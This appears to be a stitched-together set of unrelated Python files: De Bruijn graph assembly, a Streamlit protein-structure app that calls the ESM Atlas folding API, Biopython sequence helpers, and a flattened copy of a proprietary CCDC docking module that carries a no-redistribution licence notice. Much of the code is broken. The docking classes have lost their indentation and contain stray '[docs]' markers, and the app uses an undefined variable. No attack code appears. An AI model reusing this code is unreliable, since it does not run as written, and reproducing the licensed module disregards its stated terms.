var-in-name 2
var-in-name 2
2
var-out-name
var-out-name
3
var-one-set set-type set-xs
var-one-set set-type set-xs
var-one-set set-type set-xs
3
var-two-set set-type set-xs
var-two-set set-type set-xs
var-two-set set-type set-xs
2
var-one-out-set set-type set-xs
var-one-out-set set-type set-xs
1
var-two-out-set set-type set-xs
4
rule
rule
rule
rule
"""

import networkx, matplotlib.pyplot as plot


def kmers(sequence, k):
    n = len(sequence)
    kmers_list = []
    for i in range(n - k + 1):
        kmers_list += [sequence[i:i + k]]
    return kmers_list


def build_degrees(graph, _in):
    assert _in == 1 or _in == 0, "_in must be 0 or 1"
    degrees = {}
    for node in graph['nodes']:
        degrees[node] = 0

    for node in graph['nodes']:
        for edge in graph['edges']:
            if node == edge[
                _in]:  # When _in = 0, we are building the out-degrees, so we check that the node is a prefix by node == edge[_in]
                degrees[node] += 1
    return degrees


# Exercise 2
def DeBruijnGraph(reads, k):  # Steps in lecture 4 (slide 31)
    all_kmers = []
    for read in reads:  # Step 1(b)
        all_kmers += kmers(read, k)

    graph = {'nodes': [], 'edges': []}  # Step 2

    for kmer in all_kmers:  # Step 3
        prefix, suffix = kmer[:-1], kmer[1:]
        if prefix not in graph['nodes']:  # (a)
            graph['nodes'] += [prefix]
        if suffix not in graph['nodes']:  # (b)
            graph['nodes'] += [suffix]
        graph['edges'] += [[prefix, suffix]]  # (c)

    return graph


# Exercise
def mergeChains(graph, k):  # Lecture 6 (slide 17)
    _in = build_degrees(graph, _in=1)
    out = build_degrees(graph, _in=0)
    canMerge = True

    while canMerge:
        canMerge = False
        for edge in graph['edges']:  # Condition 1
            A = edge[0]
            B = edge[1]
            if out[A] == _in[B] == 1:  # Condition 2
                canMerge = True
                # Merge
                graph['edges'].remove(edge)
                graph['nodes'].remove(A);
                graph['nodes'].remove(B)
                newNode = A + B[k - 1:]
                graph['nodes'].append(newNode)  # Update nodes

                for e in graph['edges']:  # Update edges
                    if e[0] == B:
                        e[0] = newNode
                    if e[1] == A:
                        e[1] = newNode

                _in[newNode] = _in[A];
                out[newNode] = out[B]  # Update in and out degrees
                _in.pop(A);
                _in.pop(B)
                out.pop(A);
                out.pop(B)

    return graph


def visualizeDBGraph(graph):
    dbGraph = networkx.DiGraph()

    dbGraph.add_nodes_from(graph['nodes'])  # Add the nodes to the graph
    dbGraph.add_edges_from(graph['edges'])  # Add the edges to the graph

    networkx.draw(dbGraph, with_labels=True, node_size=1000)
    plot.show()


def main():
    graph = DeBruijnGraph(['TTACGTT', 'CCGTTA', 'GTTAC', 'GTTCGA', 'CGTTC'], 5)
    newGraph = mergeChains(graph, 5)
    visualizeDBGraph(newGraph)


main()
import os
from collections import Counter

import streamlit as st
from stmol import showmol
import py3Dmol
import requests
import biotite.structure.io as bsio
from testing2 import doking

# dock = doking('6lu7.pdb')
seq = 'PNIEEVALPTTGEIPFYGKAIPLELIKGGRHLIFCHSKKKCDELARQLTSLGLNAVAYYRGLDVSVIPTSGDVVVCATDALMTGFTGDYDSVIDY'
# residues = str(dock.getResidues())
# counters = Counter(dock.getResidues().values())

# st.set_page_config(layout = 'wide')
st.sidebar.title('🎈 predicitions protein')


# stmol
def render_mol(pdb):
    pdbview = py3Dmol.view(height=1000, width=1000)
    pdbview.addModel(pdb, 'pdb')
    pdbview.setStyle({'cartoon': {'color': 'spectrum'}})
    pdbview.setBackgroundColor('white')  # ('0xeeeeee')
    pdbview.zoomTo()
    pdbview.zoom(2, 800)
    pdbview.spin(True)
    showmol(pdbview, height=1000, width=1000)


# Protein sequence input
DEFAULT_SEQ = 'PNIEEVALPTTGEIPFYGKAIPLELIKGGRHLIFCHSKKKCDELARQLTSLGLNAVAYYRGLDVSVIPTSGDVVVCATDALMTGFTGDYDSVIDY'
# DEFAULT_SEQ = seq['A'] + seq['C']
txt = st.sidebar.text_area('Input sequence', DEFAULT_SEQ, height=275)


# ESMfold
def update(sequence=txt):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post('https://api.esmatlas.com/foldSequence/v1/pdb/', headers=headers, data=sequence)
    name = sequence[:3] + sequence[-3:]
    pdb_string = response.content.decode('utf-8')

    with open('predicted.pdb', 'w') as f:
        f.write(pdb_string)

    struct = bsio.load_structure('predicted.pdb', extra_fields=["b_factor"])
    # b_value = round(struct.b_factor.mean(), 4)

    # Display protein structure
    st.subheader('Visualization of predicted protein structure')
    render_mol(pdb_string)

    # plDDT value is stored in the B-factor field
    st.subheader('plDDT')
    st.write('plDDT is a per-residue estimate of the confidence in prediction on a scale from 0-100.')
    st.info(f'plDDT: {b_value}')

    st.subheader('info:')
    st.subheader('ActiveSites:')
    # st.write(dock.getActiveSites())
    st.write(
        f'====================================================================================================================')
    st.subheader('Atoms:')
    # st.write(dock.getatoms())
    st.write(
        f'====================================================================================================================')
    st.subheader('Residues:')
    # st.write(residues)

    st.subheader('Counters:')
    # st.write(counters)

    st.subheader('plots:')
    st.image('Figure_1.png')

    st.download_button(
        label="Download PDB",
        data=pdb_string,
        file_name='predicted.pdb',
        mime='text/plain',
    )


predict = st.sidebar.button('Predict', on_click=update)

if not predict:
    st.warning('👈 Enter protein sequence data!')

seq="PNIEEVALPTTGEIPFYGKAIPLELIKGGRHLIFCHSKKKCDELARQLTSLGLNAVAYYRGLDVSVIPTSGDVVVCATDALMTGFTGDYDSVIDY"
# import numpy as np
#
#
# def get_penalty(x: str, y: str, miss_match: int, plentygap: int):
#     i,j,m,n = 0,0,len(x),len(y)
#     dp = np.zeros([m + 1, n + 1], dtype=int)
#     dp[0:(m + 1), 0] = [i * plentygap for i in range(m + 1)]
#     dp[0, 0:(n + 1)] = [i * plentygap for i in range(n + 1)]
#     i = 1
#     while i <= m:
#         j = 1
#         while j <= n:
#             if x[i - 1] == y[j - 1]:
#                 dp[i][j] = dp[i - 1][j - 1]
#             else:
#                 dp[i][j] = min(dp[i - 1][j - 1] + miss_match,dp[i - 1][j] + plentygap,dp[i][j - 1] + plentygap)
#             j += 1
#         i += 1
#     l = n + m
#     i = m
#     j = n
#     posx = l
#     posy = l
#     xres = np.zeros(l + 1, dtype=int)
#     yres = np.zeros(l + 1, dtype=int)
#     while not (i == 0 or j == 0):
#         if x[i - 1] == y[j - 1]:
#             xres[posx] = ord(x[i - 1])
#             yres[posy] = ord(y[j - 1])
#             posx -= 1
#             posy -= 1
#             i -= 1
#             j -= 1
#         elif (dp[i - 1][j - 1] + miss_match) == dp[i][j]:
#             xres[posx] = ord(x[i - 1])
#             yres[posy] = ord(y[j - 1])
#             posx -= 1
#             posy -= 1
#             i -= 1
#             j -= 1
#         elif (dp[i - 1][j] + plentygap) == dp[i][j]:
#             xres[posx] = ord(x[i - 1])
#             yres[posy] = ord('_')
#             posx -= 1
#             posy -= 1
#             i -= 1
#         elif (dp[i][j - 1] + plentygap) == dp[i][j]:
#             xres[posx] = ord('_')
#             yres[posy] = ord(y[j - 1])
#             posx -= 1
#             posy -= 1
#             j -= 1
#     while posx > 0:
#         if i > 0:
#             i -= 1
#             xres[posx] = ord(x[i])
#             posx -= 1
#         else:
#             xres[posx] = ord('_')
#             posx -= 1
#     while posy > 0:
#         if j > 0:
#             j -= 1
#             yres[posy] = ord(y[j])
#             posy -= 1
#         else:
#             yres[posy] = ord('_')
#             posy -= 1
#     id = 1
#     i = l
#     while i >= 1:
#         if (chr(yres[i]) == '_') and chr(xres[i]) == '_':
#             id = i + 1
#             break
#         i -= 1
#     i = id
#     x_seq = ""
#     while i <= l:
#         x_seq += chr(xres[i])
#         i += 1
#     i = id
#     y_seq = ""
#     while i <= l:
#         y_seq += chr(yres[i])
#         i += 1
#     print(f"last num in matrix: {dp[m][n]}")
#     print(f"X seq: {x_seq}")
#     print(f"Y seq: {y_seq}")
#     print(f"matrix: "
#           f"\n {dp}")
#
# def main():
#     gene1 = "AGGGCTTTAAGGACGT"
#     gene2 = "AGGCATTTAAGGACG"
#     mismatch_penalty = 3
#     gap_penalty = 2
#     get_penalty(gene1, gene2, mismatch_penalty, gap_penalty)
#
# if __name__ == '__main__':
#     main()







import os
# path to the file to run in cmd line
cmd = "streamlit run --server.port 8080 C:\\Users\\jaguar\\PycharmProjects\\learningpandas\\AGraduationProject.py"

# returns the exit code in Windows
returned_value = os.system(cmd)
print('returned value:', returned_value)


from Bio import SeqIO
from Bio.Seq import *
from Bio.SeqUtils import *
from Bio.PDB import *




# def main():
#     parser = argparse.ArgumentParser()
#     parser.add_argument('-i', '--input', required=True)
#     parser.add_argument('-o', '--output', required=True)
#     args = parser.parse_args()
#     input_file = args.input
#     output_file = args.output
#     with open(output_file, 'w') as output_handle:
#         with open(input_file, 'r') as input_handle:
#             for record in SeqIO.parse(input_handle, 'fasta'):
#                 output_handle.write('>{}\n{}\n'.format(record.id, record.seq))
#                 output_handle.flush()

def GC_content(sequence):
    sq = Seq(sequence)
    content = GC(sq)
    return content


def transcription(sequence):
    coding_dna = Seq(sequence)
    messenger_rna = coding_dna.transcribe()
    return messenger_rna


def translation_from_dna(sequence):
    seque = Seq(sequence)
    protein = seque.translate()
    return protein


def translation_from_mrna(messenger_rna):
    seque = Seq(messenger_rna)
    protein = seque.translate()
    return protein


def reverse_complement(sequence):
    seq = Seq(sequence)
    seq = seq.reverse_complement()
    return seq


def back_transcription(messenger_rna):
    seque = Seq(messenger_rna)
    coding_dna = seque.back_transcribe()
    return coding_dna


# coding=utf8
#
# This code is Copyright (C) 2015 The Cambridge Crystallographic Data Centre
# (CCDC) of 12 Union Road, Cambridge CB2 1EZ, UK and a proprietary work of CCDC.
# This code may not be used, reproduced, translated, modified, disassembled or
# copied, except in accordance with a valid licence agreement with CCDC and may
# not be disclosed or redistributed in any form, either in whole or in part, to
# any third party. All copies of this code made in accordance with a valid
# licence agreement as referred to above must contain this copyright notice.
#
# No representations, warranties, or liabilities are expressed or implied in the
# supply of this code by CCDC, its servants or agents, except where such
# exclusion or limitation is prohibited, void or unenforceable under governing
# law.
#
#################################################################################################
'''
The :mod:`ccdc.docking` module provides an API to molecular docking functionality.

.. note:: The :mod:`ccdc.docking` module is available only to CSD-Discovery and CSD-Enterprise users.

The class :class:`ccdc.docking.Docker.LigandPreparation` provides functionality
for preparing ligands for docking. This classes encapsulate the
typical preparation activities, such as protonation and bond typing.
'''
#    >>> import os
#    >>> if 'GOLD_DIR' in os.environ and os.environ['GOLD_DIR']:
#    ...     from ccdc.docking import Docker
#    ...     from ccdc.io import MoleculeReader
#    ...     import os
#    ...     docker = Docker()
#    ...     settings = docker.settings
#    ...     protein_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'testsuite', 'testdata', '1fax_protein.mol2')
#    ...     aspirin = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'testsuite', 'testdata', 'aspirin.mol2')
#    ...     settings.add_protein_file(protein_file)
#    ...     settings.add_ligand_file(aspirin)
#    ...     settings.autoscale = 10.
#    ...     import tempfile
#    ...     tempd = tempfile.mkdtemp()
#    ...     settings.output_directory = tempd
#    ...     settings.output_file = 'aspirin_dock.mol2'
#    ...     settings.fitness_function = 'plp'
#    ...     ligand = MoleculeReader(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'testsuite', 'testdata', '1fax_ligand.mol2'))[0]
#    ...     settings.binding_site = settings.BindingSiteFromPoint(
#    ...         settings.proteins[0], ligand.centre_of_geometry(), 10.0
#    ...     )
#    ...     results = docker.dock()
#    ...     return_code = results.return_code
#    ...     ligand_reader = results.ligands
#    ...     output_file = os.path.join(settings.output_directory, settings.output_file)
#    >>> #docked_molecules = [m for m in MoleculeReader(os.path.join(tempd, output_file))]
#
##########################################################################

import sys
import os
import shutil
import glob
import subprocess
import socket
import re
import collections

from ccdc import io
from ccdc.entry import Entry
from ccdc.molecule import Coordinates, Molecule
from ccdc.protein import Protein
from ccdc.utilities import nested_class

from ccdc.utilities import _private_importer

with _private_importer() as pi:
    pi.import_ccdc_module('DockingLib')
    pi.import_ccdc_module('ChemicalAnalysisLib')
    pi.import_ccdc_module('ChemistryLib')
    pi.import_ccdc_module('AnnotationsLib')
    pi.import_ccdc_module('FileFormatsLib')

DockingLib.licence_check()

##########################################################################

[docs]


class Docker(object):
    '''Docker.'''


[docs]


@nested_class('Docker')
class LigandPreparation(object):
    '''Prepare ligands for docking.'''


[docs]


@nested_class('Docker.LigandPreparation')
class Settings(object):
    '''Configuration options for the preparation of ligands.'''
    remove_unknown_atoms = True  # Whether or not to remove unknown atoms
    assign_bond_types = True  # Whether or not to assign bond types
    standardise_bond_types = False  # Whether or not to standardise bonds to CSD conventions
    add_hydrogens = True  # Whether hydrogens need to be added
    protonate = True  # Whether protonation rules need to be applied
    protonation_rules_file = None  # Location of a file containing protonation rules


def __init__(self, settings=None):
    if settings is None:
        self.settings = Docker.LigandPreparation.Settings()
    else:
        self.settings = settings
    if self.settings.protonation_rules_file is None:
        rules_dir = io._CSDDatabaseLocator.get_optimisation_parameter_file_location()
        rules_file = os.path.join(rules_dir, 'protonation_rules.txt')
    else:
        rules_file = self.settings.protonation_rules_file
    if os.path.exists(rules_file):
        self._protonation_rules = ChemicalAnalysisLib.ProtonationRules(rules_file)
    else:
        self._protonation_rules = None


[docs]


def prepare(self, entry):
    '''Prepare an entry for docking.

    :param entry: :class:`ccdc.entry.Entry` instance
    :returns: :class:`ccdc.entry.Entry` instance with specified rules applied.
    '''
    m = entry.molecule
    if len(m.components) > 1:
        raise RuntimeError('Docking of multi-component molecules is not supported')
    if self.settings.remove_unknown_atoms:
        m.remove_unknown_atoms()
    if self.settings.assign_bond_types:
        m.assign_bond_types()
    if self.settings.standardise_bond_types:
        m.standardise_aromatic_bonds()
        m.standardise_delocalised_bonds()
    if self.settings.protonate and self._protonation_rules is not None and self._protonation_rules.valid():
        self._protonation_rules.apply_rules(m._molecule)
    if self.settings.add_hydrogens:
        m.remove_hydrogens()
        m.add_hydrogens()
    return Entry.from_molecule(m, **entry.attributes)


[docs]


@nested_class('Docker')
class Settings(object):
    '''Settings for docker.'''
    _fitness_functions = ['goldscore', 'chemscore', 'asp', 'plp']

    @classmethod
    def _path_in_distribution(self, value):
        if 'GOLD_DIR' in os.environ:
            file_name = os.path.join(os.environ['GOLD_DIR'], 'gold', value)
            if not os.path.exists(file_name):
                file_name = os.path.join(os.environ['GOLD_DIR'], value)
        elif 'MAINDIR' in os.environ:
            file_name = os.path.join(os.environ['MAINDIR'], '..', 'goldsuite', 'gold_dist', 'gold', value)
        else:
            file_name = value
        return file_name


[docs]


@nested_class('Docker.Settings')
class LigandFileInfo(object):
    '''Information about a ligand file.'''

    def __init__(self, file_name, ndocks=1, start=0, finish=0):
        self.file_name = file_name
        self.ndocks = ndocks
        self.start = start
        self.finish = finish

    def __str__(self):
        return '{file_name} {ndocks} docks, starting at {start} finishing at {finish}'.format(
            **self.__dict__
        )

    def __repr__(self):
        return "LigandFileInfo('{file_name}', {ndocks}, {start}, {finish})".format(**self.__dict__)

    def __eq__(self, other):
        return (
                self.file_name == other.file_name and
                self.ndocks == other.ndocks and
                self.start == other.start and
                self.finish == other.finish
        )


def __init__(self, _settings=None):
    '''Initialise settings.'''
    if _settings is None:
        self._settings = DockingLib.GoldConfFile()
        self.clear_protein_files()
        self.autoscale = 100.
        self._conf_file_name = './api_gold.conf'
        self._fitness_function = ''
        self._rescore_function = ''
        self.fitness_function = 'goldscore'
        self.rescore_function = ''
        self._constraints = []
        self._binding_site = None
    else:
        self._constraints = []
        self._binding_site = None
        self._settings = _settings
    self._settings.set_preserve_mol2_comments(True)
    self._gold_exe = None
    self._socket = None
    self._save_binding_site_atoms = False


def __del__(self):
    if self._socket is not None:
        self._socket.close()
        del self._socket


[docs]


@staticmethod
def from_file(file_name):
    '''Read docking settings from a gold.conf file.

    :param file_name: Location of the gold.conf file.
    '''
    settings = Docker.Settings(
        _settings=DockingLib.GoldConfFileReader().read(file_name)
    )
    settings._conf_file_name = os.path.abspath(file_name)
    settings.make_absolute_file_names(settings._conf_file_name)
    _ = settings.constraints  # Ensure they are read
    settings.binding_site = Docker.Settings.BindingSite._from_settings(settings)
    if settings._settings.run_type() == settings._settings.RESCORE_RUN:
        settings._rescore_function = settings._settings.gold_fitness_function_path()
        settings._fitness_function = ''
    elif settings._settings.run_type() == settings._settings.CONSENSUS_SCORE:
        settings._fitness_function = settings._settings.docking_fitness_function_path()
        settings._rescore_function = settings._settings.rescore_fitness_function_path()
    else:
        settings._fitness_function = settings._settings.gold_fitness_function_path()
        settings._rescore_function = settings._settings.rescore_fitness_function_path()
    score_pars = settings.score_parameter_file
    if score_pars and score_pars != 'DEFAULT' and not os.path.exists(score_pars):
        settings.score_parameter_file = os.path.basename(score_pars)

    tor_file = settings.torsion_distribution_file
    if tor_file and tor_file != 'DEFAULT' and not os.path.exists(tor_file):
        settings.torsion_distribution_file = tor_file

    rotatable_bond_override_file = settings.rotatable_bond_override_file
    if rotatable_bond_override_file and rotatable_bond_override_file != 'DEFAULT' and \
            not os.path.exists(rotatable_bond_override_file):
        settings.rotatable_bond_override_file = rotatable_bond_override_file

    return settings


[docs]


def make_absolute_file_names(self, file_name, relative=False):
    '''Convert any relative file names to absolute file names.

    :param file_name: str, the location of the settings file.
    :param relative: bool, whether to make file names relative to the settings file.
    '''
    dirpath = os.path.dirname(os.path.abspath(file_name))
    if not os.path.exists(dirpath):
        os.makedirs(dirpath)
    ligand_files = self.ligand_files
    self.clear_ligand_files()
    for lf in ligand_files:
        file_name = lf.file_name
        abs_path = os.path.abspath(os.path.join(dirpath, file_name))
        rel_path = os.path.abspath(os.path.join(dirpath, os.path.basename(file_name)))
        if relative:
            # Don't copy ligands
            lf.file_name = abs_path
        else:
            lf.file_name = abs_path
        self.add_ligand_file(lf)
    protein_files = self.protein_files
    self.clear_protein_files()
    for pf in protein_files:
        file_name = pf.file_name
        abs_path = os.path.abspath(os.path.join(dirpath, file_name))
        rel_path = os.path.abspath(os.path.join(dirpath, os.path.basename(file_name)))
        if relative:
            if not os.path.exists(rel_path) and abs_path != rel_path:
                shutil.copyfile(abs_path, rel_path)
                # pf.file_name = os.path.basename(file_name)
            pf.file_name = rel_path
        else:
            pf.file_name = abs_path
        self.add_protein_file(pf)
    if self._settings.cavity_file():
        file_name = self._settings.cavity_file()
        abs_path = os.path.abspath(os.path.join(dirpath, file_name))
        rel_path = os.path.abspath(os.path.join(dirpath, os.path.basename(file_name)))
        if relative:
            if os.path.exists(abs_path) and abs_path != rel_path:
                shutil.copyfile(abs_path, rel_path)
                self._settings.set_cavity_file(rel_path)
        else:
            self._settings.set_cavity_file(abs_path)
    if self._settings.ligand_reference_file():
        file_name = self._settings.ligand_reference_file()
        abs_path = os.path.abspath(os.path.join(dirpath, file_name))
        rel_path = os.path.abspath(os.path.join(dirpath, os.path.basename(file_name)))
        if relative:
            if os.path.exists(abs_path) and abs_path != rel_path:
                shutil.copyfile(abs_path, rel_path)
                self._settings.set_ligand_reference_file(rel_path)
        else:
            self._settings.set_ligand_reference_file(abs_path)

    waters = self._settings.waters()
    if len(waters) > 0:
        for water in waters:
            file_name = water.path_
            abs_path = os.path.abspath(os.path.join(dirpath, file_name))
            rel_path = os.path.abspath(os.path.join(dirpath, os.path.basename(file_name)))
            if relative:
                if os.path.exists(abs_path) and abs_path != rel_path:
                    shutil.copyfile(abs_path, rel_path)
                    water.path_ = rel_path
            else:
                water.path_ = abs_path

        self._settings.set_gold_waters(waters)

    # Parameter files, ...
    seed_file_setting = self._settings.seed_file()
    if seed_file_setting:
        abs_path = os.path.abspath(os.path.join(dirpath, seed_file_setting))
        rel_path = os.path.abspath(os.path.join(dirpath, os.path.basename(seed_file_setting)))
        if relative:
            # Setting to rel_path doesn't work for a dock + rescore, for some reason
            # if os.path.exists(abs_path) and abs_path != rel_path:
            #    shutil.copyfile(abs_path, rel_path)
            self._settings.set_seed_file(abs_path)
        else:
            self._settings.set_seed_file(abs_path)
    # output directory and file
    if self.output_directory:
        self._settings.set_directory(os.path.join(dirpath, self.output_directory))
    if self.output_file:
        self._settings.set_concatenated_output(os.path.join(self.output_directory, os.path.basename(self.output_file)))
    # fitting points
    if self._settings.read_fitting_points():
        abs_path = os.path.abspath(os.path.join(dirpath, self._settings.fitting_points_file()))
        rel_path = os.path.join(dirpath, os.path.basename(self._settings.fitting_points_file()))
        if relative:
            self._settings.set_fitting_points_file(rel_path)
            if self._settings.read_fitting_points():
                if relative:
                    if os.path.exists(abs_path) and abs_path != rel_path:
                        shutil.copyfile(abs_path, rel_path)
        else:
            self._settings.set_fitting_points_file(abs_path)


@property
def conf_file(self):
    '''The GOLD conf file represented by this settings instance.'''
    return self._conf_file_name


# Ligands
@property
def ligand_files(self):
    '''The ligand datafile settings.

    :returns: tuple of class:`ccdc.docking.Docker.Settings.LigandFileInfo` instances.
    '''
    return tuple(
        Docker.Settings.LigandFileInfo(
            df.ligand_filename_,
            df.n_ga_runs_,
            df.start_ligand_,
            df.finish_ligand_
        ) for df in self._settings.ligand_datafiles()
    )


[docs]


def clear_ligand_files(self):
    '''Remove all ligand datafiles from settings.'''
    self._settings.set_ligand_datafiles(tuple())


[docs]


def add_ligand_file(self, file_name, ndocks=1, start=0, finish=0):
    '''Add a file of ligands to the docking settings.

    :param file_name: a mol2 or sdf file of ligand molecules, or a :class:`ccdc.docking.Docker.Settings.LigandFileInfo` instance.
    :param ndocks: int, the number of docking attempts for each ligand
    :param start: int, index of ligand at which to start
    :param finish: int, index of ligand at which to finish
    '''
    df = DockingLib.LigandDataFile()
    if isinstance(file_name, Docker.Settings.LigandFileInfo):
        df.ligand_filename_ = file_name.file_name
        df.n_ga_runs_ = file_name.ndocks
        df.start_ligand_ = file_name.start
        df.finish_ligand_ = file_name.finish
    else:
        df.ligand_filename_ = file_name
        df.n_ga_runs_ = ndocks
        df.start_ligand_ = start
        df.finish_ligand_ = finish
    self._settings.add_ligand_datafile(df)


@property
def ligands(self):
    '''The ligands specified for docking.'''
    ligands = io.MoleculeReader(
        [l.file_name for l in self.ligand_files]
    )
    return ligands


# Proteins
[docs]


@nested_class('Docker.Settings')
class ProteinFileInfo(object):
    '''Data associated with a protein for docking.'''

    def __init__(self, file_name=None, _protein_data=None, settings=None):
        '''Initialise a ProteinFileInfo instance.

        :param file_name: str
        '''
        if _protein_data is None:
            _protein_data = DockingLib.GoldConfProteinData()
            _protein_data.set_protein_datafile(file_name)
        self._protein_data = _protein_data
        self._constraints = tuple()
        self._rotamer_libraries = []

    @property
    def file_name(self):
        '''The file name of the protein.'''
        return self._protein_data.protein_datafile()

    @file_name.setter
    def file_name(self, file_name):
        self._protein_data.set_protein_datafile(file_name)

    def __str__(self):
        return "ProteinFileInfo('%s')" % self.file_name

    __repr__ = __str__

    def __eq__(self, other):
        return self.file_name == other.file_name


[docs]


def add_constraint(self, constraint):
    '''Add a constraint to the protein.'''
    self._protein_data.add_constraint(constraint._constraint)
    self._constraints = self._constraints + (constraint,)


[docs]


def clear_constraints(self):
    '''Remove all constraints.'''
    self._protein_data.clear_constraints()
    self._constraints = tuple()


@property
def constraints(self):
    '''The constraints associated with this protein.'''
    return self._constraints


@property
def rotamer_libraries(self):
    '''The set of defined rotamer libraries for this protein.'''
    return self._rotamer_libraries


[docs]


def add_rotamer_library(self, rotamer_library):
    '''Add a rotamer library to this protein.'''
    self._protein_data.add_rotamer_library(rotamer_library._rotamer_library)
    self._rotamer_libraries.append(rotamer_library)


[docs]


def update_rotamer_library(self, rotamer_library):
    '''Update rotamer library to this protein.'''
    existing_rls = self._rotamer_libraries
    self._rotamer_libraries = []
    self._protein_data.clear_rotamer_libraries()
    for rl in existing_rls:
        if rl._rotamer_library.name() == rotamer_library._rotamer_library.name():
            self.add_rotamer_library(rotamer_library)
        else:
            self.add_rotamer_library(rl)


[docs]


def clear_rotamer_libraries(self):
    '''Remove all rotamer libraries'''
    self._protein_data.clear_rotamer_libraries()
    self._rotamer_libraries = []


@property
def protein_files(self):
    '''The protein file targets.'''
    if not hasattr(self, '_protein_info'):
        self._protein_info = tuple(
            Docker.Settings.ProteinFileInfo(_protein_data=p, settings=self)
            for p in self._settings.protein_data()
        )
        for p in self._protein_info:
            p._constraints = tuple(
                Docker.Settings.Constraint._make_constraint(
                    self, p._protein_data.constraint(i), p.file_name
                )
                for i in range(p._protein_data.nconstraints())
            )
    return self._protein_info


@property
def proteins(self):
    '''The proteins.'''

    def _read_protein(file_name):
        file_name = os.path.join(os.path.dirname(self.conf_file), file_name)
        p = Protein.from_file(file_name)
        return p

    if not hasattr(self, '_proteins'):
        self._proteins = tuple(_read_protein(f.file_name) for f in self.protein_files)
    return self._proteins


[docs]


def clear_protein_files(self):
    '''Clear the set of targets.'''
    self._settings.set_protein_data(tuple())
    if hasattr(self, '_proteins'):
        del self._proteins
    if hasattr(self, '_protein_info'):
        del self._protein_info
    if hasattr(self, '_rotamer_info'):
        del self._rotamer_info


[docs]


def add_protein_file(self, file_name):
    '''Add a target file to be docked against.'''
    if isinstance(file_name, Docker.Settings.ProteinFileInfo):
        prot_data = file_name._protein_data
    else:
        prot_data = DockingLib.GoldConfProteinData()
        prot_data.set_protein_datafile(file_name)
    self._settings.add_protein_data(prot_data)
    if hasattr(self, '_proteins'):
        del self._proteins
    if hasattr(self, '_protein_info'):
        del self._protein_info
    if hasattr(self, '_rotamer_info'):
        del self._rotamer_info


@property
def fix_all_protein_rotatable_bonds(self):
    '''Get or set whether to fix all terminal protein rotatable bonds during docking
       (can be set to True to fix them all or False to allow them to move)
    '''
    return self._settings.fix_protein_rotatable_bonds()


@fix_all_protein_rotatable_bonds.setter
def fix_all_protein_rotatable_bonds(self, value):
    self._settings.set_fix_protein_rotatable_bonds(bool(value))


[docs]


@nested_class('Docker.Settings')
class WaterFileInfo(object):
    '''Information about an active water file.'''
    _ToggleStates = {"on": DockingLib.GoldConfFile.WATER_ON,
                     "off": DockingLib.GoldConfFile.WATER_OFF,
                     "toggle": DockingLib.GoldConfFile.WATER_TOGGLE}

    _SpinStates = {"fix": DockingLib.GoldConfFile.WATER_FIX,
                   "spin": DockingLib.GoldConfFile.WATER_SPIN,
                   "trans_spin": DockingLib.GoldConfFile.WATER_TRANS_SPIN}

    @classmethod
    def _get_toggle_state_text(cls, enum_value):
        for state in cls._ToggleStates:
            if cls._ToggleStates[state] == enum_value:
                return state

        raise RuntimeError("invalid enum value? %d" % enum_value)

    @classmethod
    def _get_spin_state_text(cls, enum_value):
        for state in cls._SpinStates:
            if cls._SpinStates[state] == enum_value:
                return state

        raise RuntimeError("invalid enum value? %d" % enum_value)

    '''Information about a flexible water.'''

    def __init__(self, file_name, toggle_state="toggle", spin_state="spin", movable_distance=0.0):

        self._water = DockingLib.GoldWater()
        self.file_name = file_name
        self.toggle_state = toggle_state
        self.spin_state = spin_state
        self.movable_distance = movable_distance

    @property
    def atom_index(self):
        ''' :return the index of the atom in the water that is the Oxygen '''
        return self._water.atom_index_

    @property
    def file_name(self):
        '''
        :return the filename of the file that contains the water to be active in docking
        '''
        return self._water.path_

    @file_name.setter
    def file_name(self, file_name):
        '''
        set the filename of the file that contains the water to be active in docking.
        The file must contain a single water atom (just 3 atoms) or this will throw RuntimeError

        :param the filename of the file containing a single water molecule
        '''

        def oxygen_index(file_name):
            mol = io.MoleculeReader(file_name)[0]
            if len(mol.atoms) != 3:
                raise RuntimeError(
                    'File passed in as a water {} must contain a single water molecule (with 3 atoms)'.format(
                        file_name))
            if len([atom for atom in mol.atoms if atom.atomic_number == 1]) != 2:
                raise RuntimeError('File passed in as a water {} must contain 2 hydrogens'.format(file_name))
            index = 1
            for atom in mol.atoms:
                if atom.atomic_number == 8:  # The oxygen
                    return index
                index += 1
            raise RuntimeError('File passed in as a water {} must contain an oxygen'.format(file_name))

        if not os.path.exists(file_name):
            raise RuntimeError('Water file {} must exist'.format(file_name))

        self._water.atom_index_ = oxygen_index(file_name)
        self._water.path_ = file_name

    @property
    def toggle_state(self):
        return self._get_toggle_state_text(self._water.toggle_state_)

    @toggle_state.setter
    def toggle_state(self, state):
        if state not in self._ToggleStates:
            raise RuntimeError('Toggle state setting %s is invalid: must be one of on, off or toggle' % state)

        self._water.toggle_state_ = self._ToggleStates[state]

    @property
    def spin_state(self):
        return self._get_spin_state_text(self._water.spin_state_)

    @spin_state.setter
    def spin_state(self, state):
        if state not in self._SpinStates:
            raise RuntimeError('Spin state setting %s is invalid: must be one of fix, spin or trans_spin' % state)

        self._water.spin_state_ = self._SpinStates[state]

    @property
    def movable_distance(self):
        return self._water.distance_

    @movable_distance.setter
    def movable_distance(self, value):
        if value > 0.0 and self.spin_state != "trans_spin":
            raise RuntimeError(
                'Spin state setting %s is inconsistent with distance setting (distance is > 0.0 but trans_spin not requested)' % self.spin_state)

        if value <= 0.0 and self.spin_state == "trans_spin":
            raise RuntimeError(
                'Spin state setting %s is inconsistent with distance setting (distance is 0.0 but trans_spin requested)' % self.spin_state)
        self._water.distance_ = value

    def __str__(self):
        return 'Water from %s is set to %s and %s with a movable distance of %.2f' % (
        self.file_name, self.toggle_state, self.spin_state, self.movable_distance)

    def __repr__(self):
        return "WaterFileInfo('%s', %s, %s, %.2f)" % (
        self.file_name, self.toggle_state, self.spin_state, self.movable_distance)

    def __eq__(self, other):
        return (
            # Only check user-provided data
                self.file_name == other.file_name and
                self.toggle_state == other.toggle_state and
                self.spin_state == other.spin_state and
                self.movable_distance == other.movable_distance
        )


[docs]


def add_water_file(self, file_name, toggle_state="toggle", spin_state="spin", movable_distance=0.0):
    '''Add a water file to be docked.'''

    def check_input(file_name):
        for water in self._settings.waters():
            if water.path_ == file_name:
                raise RuntimeError("Cant add a water with file %s: water file already added in settings" % file_name)

    if isinstance(file_name, Docker.Settings.WaterFileInfo):
        check_input(file_name.file_name)
